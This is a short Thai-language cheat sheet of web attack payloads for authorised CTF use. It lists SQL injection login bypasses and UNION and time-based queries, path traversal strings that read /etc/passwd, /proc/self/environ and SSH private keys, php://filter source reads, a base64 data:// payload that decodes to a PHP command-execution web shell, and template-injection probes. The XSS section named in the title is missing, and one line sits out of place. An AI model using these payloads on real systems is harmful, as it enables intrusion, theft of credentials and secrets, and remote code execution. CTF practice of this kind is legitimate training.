================================================================
 SQLi / XSS / LFI — ชุด payload ทดสอบสั้น ๆ (สำหรับ CTF ที่ได้รับอนุญาต)
================================================================
วิธีใช้: คัดลอกไปวางในช่อง input หรือใน URL (ระวัง encode ให้ถูก)
หลักการ: ลองทีละอัน ดูว่าผลลัพธ์เปลี่ยนไหม (error / ข้อความใหม่ / เด้งหน้า)

----------------------------------------------------------------

----------------------------------------------------------------

' OR 1=1-- -
' OR 1=1#
admin'--
admin'-- -

' UNION SELECT NULL,NULL,NULL-- -      <-- เพิ่ม NULL จนจำนวนคอลัมน์ตรง
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,@@version,3-- -       <-- MySQL
' UNION SELECT 1,sqlite_version(),3-- - <-- SQLite

แบบ time-based (ดูว่ารอไหม = มีช่องโหว่)
' OR SLEEP(5)-- -                      <-- MySQL
'; SELECT pg_sleep(5)-- -              <-- PostgreSQL
' OR 1=1 AND 1=1-- -

          และอย่ายิง payload ไปเว็บที่ไม่ได้อยู่ในขอบเขตโจทย์

3) LFI / Path Traversal (อ่านไฟล์ในเครื่องเซิร์ฟเวอร์)
----------------------------------------------------------------
../../../../etc/passwd
../../../../../../etc/passwd
....//....//....//etc/passwd              <-- หลบ filter ที่ลบ ../
..%2f..%2f..%2fetc%2fpasswd               <-- URL encode
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
/etc/passwd%00                            <-- null byte (PHP รุ่นเก่า)
php://filter/convert.base64-encode/resource=index.php     <-- อ่านซอร์ส PHP
php://filter/read=convert.base64-encode/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   <-- RCE
expect://id

ไฟล์ที่ควรลองอ่าน
/etc/passwd
/etc/hostname
/proc/self/environ
/var/www/html/index.php
/var/www/html/config.php
/home/*/.ssh/id_rsa

อ่านซอร์สด้วย php filter แล้วถอด base64

----------------------------------------------------------------
4) คำสั่งที่ควรลองเพิ่ม (ไม่ใช่ payload แต่ช่วยได้บ่อย)
----------------------------------------------------------------
- เปลี่ยน method: curl -X POST / PUT แทน GET
- ดู response header: curl -i
- ใส่ header แปลก ๆ: X-Forwarded-For: 127.0.0.1
- ตรวจว่ามี WAF ไหม: ส่ง payload แล้วดูหน้า error
- ไฟล์ backup: index.php.bak, index.php~, .index.php.swp, .DS_Store
- ไฟล์ git: /.git/HEAD, /.git/config
- ถ้าเป็น Python/Flask: {{7*7}} (SSTI) -> ถ้าได้ 49 แปลว่ามีช่องโหว่ template injection
- SSTI ต่อยอด: {{config}}, {{''.__class__.__mro__}}, {{cycler.__init__.__globals__}}
- ถ้าเป็น Node.js: {{7*7}} หรือ <%= 7*7 %>

----------------------------------------------------------------
5) กฎความปลอดภัย
----------------------------------------------------------------
- ยิงเฉพาะเป้าหมายในโจทย์ CTF เท่านั้น
- ห้ามใช้ payload พวกนี้กับเว็บจริงของคนอื่น (ผิดกฎหมาย)
- ถ้าโจทย์ให้ VPN/ขอบเขตมา ให้อยู่ในขอบเขตนั้นเท่านั้น
